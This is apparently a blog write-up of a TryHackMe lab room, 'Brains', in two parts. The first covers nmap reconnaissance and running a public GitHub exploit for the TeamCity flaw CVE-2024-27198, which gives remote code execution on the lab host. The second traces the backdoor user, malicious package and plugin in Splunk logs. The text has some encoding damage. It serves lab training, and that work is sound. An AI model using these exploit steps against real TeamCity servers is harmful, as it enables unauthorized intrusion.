---
title: Write-up â€” Brains
date: 2024-10-08 12:34:27 AM
categories: [Write-up, Try Hack Me]
tags: [Try Hack Me, Write-up, ctf]
image: 'assets/img/articles/Brains.png'
description: This room has two parts, the first one is offensive and the second one is defensive.
---

> Walkthrough of room Brains from TryHackMe :
> [https://tryhackme.com/r/room/brains](https://tryhackme.com/r/room/brains)

This room has two parts, the first one is offensive and the second one is defensive.

---

## Part one ğŸ¥·â€” Exploit the server!

There only one mission here, find the flag!

> What is the content of flag.txt in the userâ€™s home folder?

I start by checking if the target is reachable.

![ping test](/assets/img/2024-10-13-THM-Brain/1_daZkj3P1REKt6ayGRHRiUw.webp) _ping test_

Everything seems okay, letâ€™s exploit then!

### Reconnaissance

![recon by arnold](https://miro.medium.com/v2/resize:fit:640/format:webp/0*hVWUAlIpF3m7rIu5.gif "recon by arnold")

We gonna start by *reconnaissance* to be aware of all (almost) possibilities. Itâ€™s more interesting to know what youâ€™re getting into.

```zsh
nmap 10.10.125.92  
  
Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-12 22:02 BST  
Nmap scan report for ip-10-10-125-92.eu-west-1.compute.internal (10.10.125.92)  
Host is up (0.0038s latency).  
Not shown: 997 closed ports  
PORT STATE SERVICE  
22/tcp open ssh  
80/tcp open http  
50000/tcp open ibm-db2  
MAC Address: 02:9D:92:C4:AB:2B (Unknown)  
  
Nmap done: 1 IP address (1 host up) scanned in 1.67 seconds
```

There are three possible options:

- SSH: May be a brute-force or anonymous login (the least likely)
- HTTP: May be a WebApp hosted locally (Enumeration with gobuster)
- ibm-db2 onÂ **50000/tcpd**

### HTTP port

![picture of the website "under maintenance"](/assets/img/2024-10-13-THM-Brain/1_XvL-V9YMDG24FEdyY0s02w.webp) _under maintenance_

The site isÂ _under maintenance_Â and Gobuster showed nothing.

![a man crying](https://miro.medium.com/v2/resize:fit:640/format:webp/1*gpP4cfml0n8rYgx3Uhbn5g.gif "i am crying")

But letâ€™s move on theÂ **_port 50000_**.

### ibm-db2 port

![login page to TeamCity webapp](/assets/img/2024-10-13-THM-Brain/1_3d_ry35GB1FW_qfbqEWLKw.webp) _Login page of TeamCity_

- Port 50000 is used for the ibm-db2 service
- Database service
- Login page at:Â `http://10.10.125.92:50000/login.html`

![That's our target](https://miro.medium.com/v2/resize:fit:640/format:webp/1*fRWHPZl9rgUm3nYmW6GhUw.gif "Target founded")

- Login page uses Jetbrain TeamCity `version 2023.11.03`

After Googling (Jetbrain TeamCity version 2023.11.03 CVE) a bit we found:

> TeamCity is a continuous integration server developed by JetBrains. (from jetbrains.com)

- Jetbrain TeamCity versionÂ _vulnerable_Â toÂ **CVE-2024â€“27198**
- PossibleÂ **Remote Code Execution**Â ([https://github.com/W01fh4cker/CVE-2024-27198-RCE.git](https://github.com/W01fh4cker/CVE-2024-27198-RCE.git%60))

![bingo](https://miro.medium.com/v2/resize:fit:440/format:webp/1*eI-JQ5cJwVTCYnZ3DY7_Mw.gif "bingo")

Enough of reconnaissance, letâ€™s try this RCE.

### RCE exploit

![Github repo of the RCE script](/assets/img/2024-10-13-THM-Brain/1_kq_J76kVztxMcrGESL2jIw.png)

**Installation**

```bash
git clone https://github.com/W01fh4cker/CVE-2024-27198-RCE.git  
  
cd CVE-2024-27198-RCE  
  
pip install requests urllib3 faker  
  
# I got troubles executing the python script  
# ModuleNotFoundError raised (faker not found)  
# The solution for me (do it only if the script raise the same error):  
  
sudo apt install faker
```

Now everything seems good. Time to execution

```bash
python CVE-2024-27198-RCE.py -t http://10.10.125.92:50000
```

The result:

![TeamCity RCE script execution](/assets/img/2024-10-13-THM-Brain/1_L89gRT7r3JZeK98qXopRlg.png)

The box is over, weâ€™re in ğŸ¥·

![Neo inside the matrix](https://miro.medium.com/v2/resize:fit:220/1*sGrk_cgQUg4uRa4uL1qlfg.gif "I'm in")

First flag done âœ…

![1st flag](/assets/img/2024-10-13-THM-Brain/1_pvvCOATvbZBB33Uw0w_3uQ.png) _1st flag_

---
## Part two ğŸ•µï¸â€â™‚ï¸â€” Letâ€™s investigate

![Duffy investigating](https://miro.medium.com/v2/resize:fit:220/1*aUMpEFOwKFmwd5StXfgNJA.gif "time to investigation")


Letâ€™s visitÂ `http://<TARGET>:8000`Â to get connected withÂ ***Splunk***.

> What is the name of the backdoor user which was created on the server after exploitation?

Go to â€œ**Search & Reporting > Data Summary > Sourcetypesâ€**

Go to â€œ**Search & Reporting > Data Summary > Sourcetypesâ€**

![](/assets/img/2024-10-13-THM-Brain/1_1Hp9yrLiI1paEyXoVIIT_Q.png)

![](/assets/img/2024-10-13-THM-Brain/1_4oLFZbB9w-6HwUGlAIN9MA.png)

Then chooseÂ **_auth_logs_**Â becauseÂ **user creation**Â is probably related toÂ **authentication**Â than the other sources here.

![](/assets/img/2024-10-13-THM-Brain/1_wrYmw2IgFr4v1CA0lTx6Ww.png)

Change the observation windows from â€œ**Last 24 hoursâ€**Â to â€œ**Before (today)â€**and apply.

![](/assets/img/2024-10-13-THM-Brain/1_1Q4_glyNlV4clZhNAGplJg.png)

At the bottom left of the website, click to get more fields.

![](/assets/img/2024-10-13-THM-Brain/1_wZDwItrzRbZ1-g8bYsjClg.png)

Expand the â€œ**nameâ€**Â field and the flag the malicious one. Click on the malicious name and you will get the logs related. Save the date of these logs 07/04/2024 (mm-dd-yyyy).

![2nd flag](/assets/img/2024-10-13-THM-Brain/1_mOxjyJtbEvNbBsiNBZ2aKQ.png) _2nd flag_


What is the name of the malicious-looking package installed on the server?

Now we have to go back toÂ **Data summary**Â and chooseÂ **_packages_**.

![](/assets/img/2024-10-13-THM-Brain/1_WD_ERZsySZVmNC0wU5KkLQ.png)

Letâ€™s change the observation windows fromÂ **â€œLast 24 hoursâ€**Â toÂ **â€œSince 7/4/24â€**, apply, click on the key word â€œ**_installedâ€_**, thenÂ **Add to search**.  
It will only show the installation logs. Still huge, reduce the observation window and move closer to 7/4/24 until there are fewer than 5 logs.

![](/assets/img/2024-10-13-THM-Brain/1_1iviYRCbpKX06vV2Sf19AQ.png)

The third flag is here.

![3rd flag](/assets/img/2024-10-13-THM-Brain/1_dTRPCRiAxpNxoX_GUm9hRA.png) _3rd flag_


> What is the name of the plugin installed on the server after successful exploitation?

Now we have to go back toÂ **Data summary**Â and chooseÂ **_Sources/teamcity-activities.log_**.

![](/assets/img/2024-10-13-THM-Brain/1_HjQTWX-PXUxCfMrJzova0w.png)

Filter with â€œ**_pluginâ€_**Â and here is theÂ **last flag**.

![4th flag](/assets/img/2024-10-13-THM-Brain/1_aUx1glaDyYhxpBWqwA3J0A.png) _4th flag_


All flags down, mission passed.

![](https://media1.tenor.com/m/lQBJJmatxPYAAAAd/mission-accomplished-penguins.gif)

Be proud of what youâ€™ve accompliincludeshed.

See you soon!

> â€œSecurity used to be an inconvenience sometimes, but now itâ€™s a necessity all the time.â€ â€” Martina Navratilova
